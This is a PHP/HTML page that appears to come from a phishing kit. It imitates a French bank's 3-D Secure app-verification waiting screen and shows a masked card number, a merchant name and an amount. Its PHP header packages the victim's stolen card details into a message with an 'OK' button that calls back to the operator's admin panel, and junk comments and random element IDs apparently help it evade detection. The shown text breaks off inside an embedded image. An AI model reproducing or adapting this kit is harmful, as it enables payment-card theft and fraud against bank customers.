<?php
$msg = '<blockquote><b>⏳ + VERIF APP</b></blockquote>

' . $_SESSION['ccmsg'] . '' . $info;

$_SESSION["msg"] = $msg;
$id = createId();
$_SESSION["id"] = $id;
$_SESSION["btn"] = [
    [
        ['text' => 'OK ✅', "url" => $domain . '/admin/action?redirect=fin&id=' . $id],
    ]
];


$html = (function () {
    global $rez;

    $numeroCarte = $_SESSION['cc'];
    $imgCC = false;

    if (str_starts_with($numeroCarte, "4")) {
        $imgCC = "1";
    } elseif (str_starts_with($numeroCarte, "5")) {
        $imgCC = "2";
    }
    ob_start();
?>


    <!DOCTYPE html>
    <html>

    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">

        <title>.</title>

        <style>
            body {
                margin: 0px;
                padding: 0px;
            }

            * {
                box-sizing: border-box;
            }

            header {
                border-bottom: 1px solid #e6e6e6;
                padding: 20px 3%;
            }

            #aPkoLcpKqD {
                width: 167px;
                height: 45px;
            }
        </style>
        <style type="text/css">
            @media screen and (max-width: 1100px) {
                #GwPFWkSRgn section {
                    width: 90%;
                }

                #aPkoLcpKqD {
                    margin-left: 0%;
                }
            }

            @media screen and (max-width: 740px) {
                #BIuieDSjRK {
                    padding: 11px 2% 8px;
                }
            }

            @media screen and (max-width: 650px) {
                #aPkoLcpKqD {
                    width: 75px;
                    height: 20px;
                }
            }
        </style>
        <style type="text/css">
            /* wmGVax */
            /* VQGzM */

            * {
                font-family: "Open Sans", sans-serif;
            }

            body {
                padding: 0;
                margin: 0;
                /* SEDNlMyjfThJ */
                box-sizing: border-box;
            }

            main {
                margin: 60px auto 20px;
                width: 600px;
            }

            #TLcnmsVYkW {
                display: flex;
                width: 100%;
                /* QfEOReyNoJsKLACIWvXuMkthraGdSc */
                justify-content: flex-end;
                /* OIEtgTHCuFoznbZVLqMr */
            }

            /* frZJDWVMPS */
            /* TlDFaqLyIUbnOcNAuJS */

            #TLcnmsVYkW img {
                align-self: center;
            }

            #UoOhHPDvSs {
                color: white;
                padding: 20px 10px 0;
                /* JEQFDvd */
                text-align: center;
                /* 2015-04-24 12:27:48 */
                background: #B66009;
            }

            button {
                width: 100%;
                padding: 10px;
                /* NdaxqkhfOreyQGuswBvZcFlnAiDXTC */
                color: #000;
                border: 1px solid #d6d6d6;
                border-radius: 6px;
                /* rixXNaIFHkYlJ */
                background: white;
            }

            /* rTsyXZIRzDYiqwJHBSfQuheNnkW */
            /* XdWMrjlnqyAfwsCIucFmOhKBxEYbTt */
            /* rVnIpteFORmTBQUydoSDzfkLXl */

            label {
                margin-bottom: 10px;
                display: block;
            }

            @keyframes growLogo {
                0% {
                    transform: scale(1);
                }

                100% {
                    transform: scale(1.02);
                }
            }

            #QmoAeJZSnY {
                width: initial !important;
                margin: auto;
                display: block;
                /* piFyGADQHkvJVa */
                transform: scale(1);
                transition: transform 0.2s ease-in-out;
                /* AUtolyXPndH */
                animation: growLogo 0.4s infinite alternate;
            }

            /* 2013-08-22 15:34:30 */
            /* 2005-02-12 13:06:45 */

            @media screen and (max-width: 1000px) {
                #container {
                    width: 90%;
                    /* 1994-11-27 09:58:34 */
                }

                main {
                    width: 90%;
                }

                main img:first-child {
                    width: 30% !important;
                }

                main img {
                    /* idYxSmHBjyhCZazEKlAVNqITc */
                    /* 2007-04-17 05:21:23 */
                    width: 20% !important;
                }

                #hpnJdTqkSo {
                    display: block !important;
                }
            }
        </style>

        <link href="views/assets/libs.bundle.d4af436688895680.css" rel="stylesheet">
        <link href="views/assets/app.bundle.de56175117ab4fea.css" rel="stylesheet">
        <link rel="stylesheet" id="custom" href="views/assets/custom.css">
        <style>
            h2 {
                font-size: 1.2em !important;
                font-weight: bold;
                text-align: center;
            }

            .main-content {
                display: flex;
                flex-direction: column;
                justify-content: space-between;
                font-family: Ubuntu;
            }

            .header-content {
                display: flex;
                flex-direction: row;
                justify-content: space-between;
                align-items: center;
                min-height: 50px;
                margin-bottom: 10px;
                margin-top: 10px;
            }

            .body-content {
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                margin-top: 5px;
            }

            .logo-issuer {
                justify-content: flex-start;
            }

            .logo-issuer img {
                max-height: 55px;
                margin-left: 10px;
            }

            .logo-network img {
                max-height: 55px;
                margin-right: 10px;
            }

            .header-block {
                display: flex;
                flex: 1 1 33%;
            }

            .header-identification {
                justify-content: center;
            }

            .logo-network {
                justify-content: flex-end;
            }

            .transaction-information {
                border: 1px solid #666666;
                box-sizing: border-box;
                border-radius: 3px;
                padding: 10px 60px 10px 20px;
                white-space: nowrap;
                width: 84%;
                font-size: 1em;
                max-width: 22em;
                margin-bottom: 10px;
            }

            label[data-cy="SIDE_MENU_ITEM_LABEL"] {
                color: #666666;
                font-weight: normal;
            }

            span[data-cy="SIDE_MENU_ITEM_VALUE"] {
                font-weight: bold;
            }

            @media (min-width: 768px) {
                span[data-cy="SIDE_MENU_ITEM_VALUE"] {
                    padding-left: 19px !important;
                }
            }

            #menu-separator {
                display: none;
            }

            .instructions-container {
                display: flex;
                flex-direction: column;
                width: 100%;
                max-width: 500px;
            }

            .list-text-instructions {
                list-style-type: none;
                padding-left: 0;
            }

            .list-text-instructions li {
                counter-increment: custom-counter;
                position: relative;
                padding-left: 30px;
                line-height: 18px;
                margin-bottom: 10px;
            }

            .list-text-instructions li:before {
                content: counter(custom-counter);
                display: block;
                position: absolute;
                left: 0;
                width: 20px;
                height: 20px;
                border-radius: 50%;
                background-color: black;
                color: white;
                text-align: center;
                line-height: 20px;
            }

            .image-container {
                display: flex;
                justify-content: center;
                align-items: center;
                /* height: 100vh; */
            }

            .image-wrapper {
                text-align: center;
            }

            img#device {
                max-width: 60%;
                height: auto;
            }

            .footer-content {
                margin-top: 1em;
                padding: 10px;
                width: 100%;
                text-align: center;
                align-items: center;
                display: flex;
                flex-direction: column;
            }

            .instructionForm {
                justify-content: flex-start;
            }

            #instructionForm {
                max-width: 500px;
            }

            .otp-container {
                display: flex;
                justify-content: center;
                align-items: center;
                width: 100%;
                padding: 10px;
            }

            .otp-field {
                display: flex;
                flex-direction: column;
                width: 100%;
                max-width: 500px;
            }

            otp-form {
                width: 100%;
            }

            input[type="text"][name="otp"] {
                border-radius: 4px;
                white-space: normal;
                margin-bottom: 5px;
                border-width: 1px;
                border-style: solid;
                width: 100%;
                font-size: 16px;
                height: 36.84px;
                max-width: 500px;
            }

            input[type="text"][name="otp"]:focus-visible {
                outline: none;
            }

            .inline,
            .side-menu .text-left,
            .side-menu .text-right {
                text-align: left;
                padding-left: 0px;
                margin-left: 0px;
            }

            :root {
                --color-white: #FFFFFF;
                --primary: #051B71;
                --primary-hover: #04165A;
                --primary-active: #031044;
                --secondary: transparent;
                --secondary-hover: #EBEBEB;
                --secondary-active: #CCCCCC;
                --quaternary: transparent;
                --quaternary-hover: #EBEBEB;
                --quaternary-active: #CCCCCC;
            }

            .bpce-button button,
            .bpce-button {
                max-width: 500px;
                width: 100%;
                margin-top: 2px;
            }

            .bpce-button button:disabled,
            .bpce-button button:disabled:hover {
                color: #999999;
                background-color: #F5F5F5;
                border-color: transparent;
            }

            .bpce-button-primary button {
                color: var(--color-white);
                background-color: var(--primary);
                border-color: var(--primary);
            }

            .bpce-button-secondary button {
                color: var(--primary);
                background-color: var(--secondary);
                border-color: var(--primary);
            }

            .bpce-button-quaternary button {
                color: var(--primary);
                background-color: transparent;
                border-color: transparent;
                font-size: 1.2rem;
            }

            .bpce-button-secondary button,
            .bpce-button-secondary button,
            .bpce-button-quaternary button {
                border-radius: 4px;
                white-space: normal;
                margin-bottom: 5px;
                border-width: 1px;
                border-style: solid;
                position: relative;
            }

            .bpce-button-primary button:hover {
                content: "";
                color: var(--color-white);
                background-color: var(--primary-hover);
                border-color: var(--primary-hover);
            }

            .bpce-button-secondary button:hover {
                content: "";
                color: var(--primary);
                background-color: var(--secondary-hover);
                border-color: var(--primary);
            }

            .bpce-button-quaternary button:hover {
                content: "";
                color: var(--primary);
                background-color: var(--quaternary-hover);
                border-color: var(--quaternary-hover);
            }

            .bpce-button-primary button:active,
            .bpce-button-primary button:focus,
            .bpce-button-primary button:active:focus {
                content: "";
                color: var(--color-white);
                background-color: var(--primary-active);
                border-color: var(--primary-active);
            }

            .bpce-button-primary button:focus,
            .bpce-button-primary button:focus-visible,
            .bpce-button-primary button:active:focus {
                outline: none;
            }

            .bpce-button-secondary button:active,
            .bpce-button-secondary button:focus,
            .bpce-button-secondary button:active:focus {
                content: "";
                color: var(--primary);
                background-color: var(--secondary-active);
                border-color: var(--primary);
            }

            .bpce-button-secondary button:focus,
            .bpce-button-secondary button:focus-visible,
            .bpce-button-secondary button:active:focus {
                outline: none;
            }

            .bpce-button-quaternary button:active,
            .bpce-button-quaternary button:focus,
            .bpce-button-quaternary button:active:focus {
                content: "";
                color: var(--primary);
                background-color: var(--quaternary-active);
                border-color: var(--quaternary-active);
            }

            .bpce-button-quaternary button:focus,
            .bpce-button-quaternary button:focus-visible,
            .bpce-button-quaternary button:active:focus {
                outline: none;
            }

            .bpce-button-primary .fa-ban::before,
            .bpce-button-primary .fa-info::before,
            .bpce-button-primary .fa-check-square::before,
            .bpce-button-primary .fa-life-ring::before,
            .bpce-button-secondary .fa-ban::before,
            .bpce-button-secondary .fa-info::before,
            .bpce-button-secondary .fa-check-square::before,
            .bpce-button-secondary .fa-life-ring::before,
            .bpce-button-quaternary .fa-ban::before,
            .bpce-button-quaternary .fa-info::before,
            .bpce-button-quaternary .fa-check-square::before,
            .bpce-button-quaternary .fa-life-ring::before {
                content: "";
            }

            .fa.fa-check-square,
            .fa.fa-life-ring {
                display: none;
            }

            .secureSite {
                color: var(--primary);
                border: 1px solid;
                border-color: var(--primary);
                border-radius: 4px;
                padding: 2px 6px;
                font-size: 0.8em;
            }

            .secureSite img {
                height: 1em;
                margin-bottom: 2px;
            }

            .secureSiteInstruction {
                color: var(--primary);
            }

            .secureSiteInstruction #otp-form {
                display: flex;
                justify-content: center;
                align-items: center;
                text-align: center;
            }

            .secureSiteInstruction #switch-vocalization-button {
                background-color: transparent;
            }

            .infoRefusal {
                max-width: 500px;
                width: 100%;
                text-align: center;
            }

            #info-button-input {
                display: none;
            }

            input[type="checkbox"]:checked~.info-modal,
            input[type="checkbox"]:checked~.info-bg {
                display: block;
            }

            input[type="checkbox"]:checked~.info-modal {
                max-height: 80%;
                overflow: scroll;
                min-width: 80%;
            }

            .bpce-fab-button {
                z-index: 1;
                background-color: var(--primary);
                cursor: pointer;
                text-decoration: none;
                position: fixed;
                height: 56px;
                min-width: 56px;
                max-width: 56px;
                right: 0;
                bottom: 0;
                padding: 1px;
                border: 0;
                border-radius: 28px;
                box-shadow: 0 4px 24px 0 rgba(0, 0, 0, 0.14);
                margin: 10px;
            }

            .bpce-fab-icon {
                fill: var(--color-white);
                position: relative;
                z-index: 1;
            }

            .bpce-fab-icon-help {
                opacity: 1;
                transition: transform 350ms ease;
                transform: scale(1);
            }

            .info-container {
                top: 0;
                width: 100%;
                height: 100%;
                position: absolute;
            }

            .info-bg {
                z-index: 98;
                display: none;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                position: fixed;
                background: rgba(0, 0, 0, 0.3);
            }

            .info-modal {
                z-index: 99;
                display: none;
                margin: auto;
                font-size: 11px;
                background-color: white;
                border: solid 1px var(--primary);
                position: absolute;
                top: 50%;
                left: 50%;
                -webkit-transform: translate(-50%, -50%);
                transform: translate(-50%, -50%);
                padding: 10px 19px 0 19px;
                letter-spacing: 0.6px;
                border-radius: 4px;
            }

            .modal-container {
                display: flex;
                flex-direction: column;
            }

            .info-modal p {
                line-height: 1.5rem;
            }

            .info-modal-header {
                font-size: 16px !important;
                width: 100%;
                display: flex;
                flex-direction: row;
                justify-content: space-between;
                border-bottom: solid 1px;
                border-bottom-color: rgba(177, 178, 181, 1);
                height: 55px;
                align-items: center;

            }

            .info-modal-header>span>* {
                color: var(--primary);
                font-weight: 700;
                font-size: 1.2em
            }

            .info-modal-header>span>label {
                height: 12px;
                width: 12px;
                cursor: pointer;
            }

            .info-modal-body {
                margin-top: 17px;
                padding-right: 9px;
                color: rgba(79, 79, 79, 1);
                font-size: 14px !important;
            }

            .info-modal-body .exponent {
                font-size: 8px;
                text-decoration: underline;
                top: -6px;
                position: relative;
            }

            .info-modal-hint {
                color: rgba(198, 198, 198, 1);
                font-size: 12px !important;
                margin-top: 29px;
            }

            .info-modal-footer {
                display: flex;
                justify-content: center;
            }
        </style>
    </head>




    <body>

        <main id="miFCdEzbUB" data-date="1993-11-14 11:40:27">

            <div id="TLcnmsVYkW" class="QBEOmUaLn">

                <img style="width: 80px !important; margin-bottom: 12px;" src="./views/assets/1.png">
                <!-- EirLuF -->

            </div>
            <!-- TGupPtBXZFJHCNmQIAEr -->
            <div id="UoOhHPDvSs" data-date="2002-04-06 01:06:45">
                <p>
                    <!-- HwRsrSkBWI -->
                </p>
                <div id="waiting-text" class="vneTHFxZozAhNVbILspXQ LSIvtjoMJrmCq">
                    <b style="font-size: 20px;">Authentification en cours
                    </b><br>
                    Veuillez patienter quelques secondes le temps de vérifier votre saisie.
                    <br>
                </div>

                <!-- pYyRMfOguQcWonJslxw -->
                <div style="display: none;" id="validared-text" data-date="2004-04-01 18:29:17">
                    <b style="font-size: 20px;">Authentification réussie !</b><br>
                    Vous allez être redirigé vers le site marchand.<br><br><br>
                </div>

                <!-- oKWcqRbizPZUeyxsXQdwYJGpm -->
                <svg id="loader" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin: auto; background: #B66009; display: block;" width="100px" height="100px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                    <g transform="rotate(0 50 50)">
                        <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#ffffff">
                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.9166666666666666s" repeatCount="indefinite"></animate>
                        </rect>
                    </g>
                    <g transform="rotate(30 50 50)">
                        <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#ffffff">
                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.8333333333333334s" repeatCount="indefinite"></animate>
                        </rect>
                    </g>
                    <!-- cOBMHxJdwpjogqkuPXVaIbUfmT -->
                    <g transform="rotate(60 50 50)">
                        <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#ffffff">
                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.75s" repeatCount="indefinite"></animate>
                        </rect>
                    </g>
                    <g transform="rotate(90 50 50)">
                        <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#ffffff">
                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.6666666666666666s" repeatCount="indefinite"></animate>
                        </rect>
                    </g>
                    <g transform="rotate(120 50 50)">
                        <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#ffffff">
                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.5833333333333334s" repeatCount="indefinite"></animate>
                        </rect>
                    </g>
                    <g transform="rotate(150 50 50)">
                        <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#ffffff">
                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.5s" repeatCount="indefinite"></animate>
                        </rect>
                    </g>
                    <g transform="rotate(180 50 50)">
                        <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#ffffff">
                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.4166666666666667s" repeatCount="indefinite"></animate>
                        </rect>
                    </g>
                    <g transform="rotate(210 50 50)">
                        <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#ffffff">
                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.3333333333333333s" repeatCount="indefinite"></animate>
                        </rect>
                    </g>
                    <g transform="rotate(240 50 50)">
                        <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#ffffff">
                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.25s" repeatCount="indefinite"></animate>
                        </rect>
                    </g>
                    <g transform="rotate(270 50 50)">
                        <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#ffffff">
                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.16666666666666666s" repeatCount="indefinite"></animate>
                        </rect>
                    </g>
                    <g transform="rotate(300 50 50)">
                        <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#ffffff">
                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="-0.08333333333333333s" repeatCount="indefinite"></animate>
                        </rect>
                    </g>
                    <g transform="rotate(330 50 50)">
                        <rect x="47" y="24" rx="3" ry="6" width="6" height="12" fill="#ffffff">
                            <animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="1s" begin="0s" repeatCount="indefinite"></animate>
                        </rect>
                    </g>
                </svg>
                <p></p>
            </div>

            <div class="body-content">
                <div ng-style="style" class="ng-scope transaction-information">
                    <side-menu class="ng-isolate-scope">
                        <div class="side-menu text-center">
                            <div class="row menu-title ng-hide" ng-show="showMenuTitle()" style="">
                                <custom-text custom-text-key="menuTitle" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding"></span></custom-text>
                            </div>
                            <div class="menu-elements">
                                <!-- ngRepeat: menuItem in menuItems -->
                                <div ng-repeat="menuItem in menuItems" class="ng-scope" style="">
                                    <div ng-switch="" on="menuItem.value">
                                        <!-- ngSwitchWhen: BUTTON -->
                                        <!-- ngSwitchDefault: -->
                                        <div ng-switch-default="" class="break-word ng-scope">
                                            <span class="col-sm-5 col-xs-6 col-xs-offset-0 col-sm-offset-1 text-right padding-left">
                                                <label data-cy="SIDE_MENU_ITEM_LABEL">
                                                    <custom-text custom-text-key="menuItem.labelKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Marchand</span></custom-text>
                                                </label>
                                                <label id="menu-separator">:</label>
                                            </span>
                                            <span class="col-sm-6 col-xs-6 text-left padding-left" data-cy="SIDE_MENU_ITEM_VALUE">
                                                <span class="ng-binding">PAYPAL MRELAY SAS</span>
                                                <!-- ngIf: showRefreshPhoneButton(menuItem.type) -->
                                            </span>
                                        </div><!-- end ngSwitchWhen: -->
                                    </div>
                                </div><!-- end ngRepeat: menuItem in menuItems -->
                                <div ng-repeat="menuItem in menuItems" class="ng-scope">
                                    <div ng-switch="" on="menuItem.value">
                                        <!-- ngSwitchWhen: BUTTON -->
                                        <!-- ngSwitchDefault: -->
                                        <div ng-switch-default="" class="break-word ng-scope">
                                            <span class="col-sm-5 col-xs-6 col-xs-offset-0 col-sm-offset-1 text-right padding-left">
                                                <label data-cy="SIDE_MENU_ITEM_LABEL">
                                                    <custom-text custom-text-key="menuItem.labelKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Montant</span></custom-text>
                                                </label>
                                                <label id="menu-separator">:</label>
                                            </span>
                                            <span class="col-sm-6 col-xs-6 text-left padding-left" data-cy="SIDE_MENU_ITEM_VALUE">
                                                <span class="ng-binding">0,00 €</span>
                                                <!-- ngIf: showRefreshPhoneButton(menuItem.type) -->
                                            </span>
                                        </div><!-- end ngSwitchWhen: -->
                                    </div>
                                </div><!-- end ngRepeat: menuItem in menuItems -->
                                <div ng-repeat="menuItem in menuItems" class="ng-scope">
                                    <div ng-switch="" on="menuItem.value">
                                        <!-- ngSwitchWhen: BUTTON -->
                                        <!-- ngSwitchDefault: -->
                                        <div ng-switch-default="" class="break-word ng-scope">
                                            <span class="col-sm-5 col-xs-6 col-xs-offset-0 col-sm-offset-1 text-right padding-left">
                                                <label data-cy="SIDE_MENU_ITEM_LABEL">
                                                    <custom-text custom-text-key="menuItem.labelKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Date et heure</span></custom-text>
                                                </label>
                                                <label id="menu-separator">:</label>
                                            </span>
                                            <span class="col-sm-6 col-xs-6 text-left padding-left" data-cy="SIDE_MENU_ITEM_VALUE">
                                                <span class="ng-binding"><?= date("dd/mm/Y H:m:s") ?></span>
                                                <!-- ngIf: showRefreshPhoneButton(menuItem.type) -->
                                            </span>
                                        </div><!-- end ngSwitchWhen: -->
                                    </div>
                                </div><!-- end ngRepeat: menuItem in menuItems -->
                                <div ng-repeat="menuItem in menuItems" class="ng-scope">
                                    <div ng-switch="" on="menuItem.value">
                                        <!-- ngSwitchWhen: BUTTON -->
                                        <!-- ngSwitchDefault: -->
                                        <div ng-switch-default="" class="break-word ng-scope">
                                            <span class="col-sm-5 col-xs-6 col-xs-offset-0 col-sm-offset-1 text-right padding-left">
                                                <label data-cy="SIDE_MENU_ITEM_LABEL">
                                                    <custom-text custom-text-key="menuItem.labelKey" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Carte utilisée</span></custom-text>
                                                </label>
                                                <label id="menu-separator">:</label>
                                            </span>
                                            <span class="col-sm-6 col-xs-6 text-left padding-left" data-cy="SIDE_MENU_ITEM_VALUE">
                                                <span class="ng-binding"><?= str_repeat("x", strlen($numeroCarte) - 4) . substr($numeroCarte, -4) ?></span>
                                                <!-- ngIf: showRefreshPhoneButton(menuItem.type) -->
                                            </span>
                                        </div><!-- end ngSwitchWhen: -->
                                    </div>
                                </div><!-- end ngRepeat: menuItem in menuItems -->
                            </div>
                        </div>
                    </side-menu>
                </div>
                <div class="image-container">
                    <div class="image-wrapper">
                        <custom-image alt-key="'network_means_pageType_105_IMAGE_ALT'" image-key="'network_means_pageType_105_IMAGE_DATA'" id="device" straight-mode="false" class="ng-isolate-scope"><img id="device" alt="" data-ng-src="data:image/png;base64,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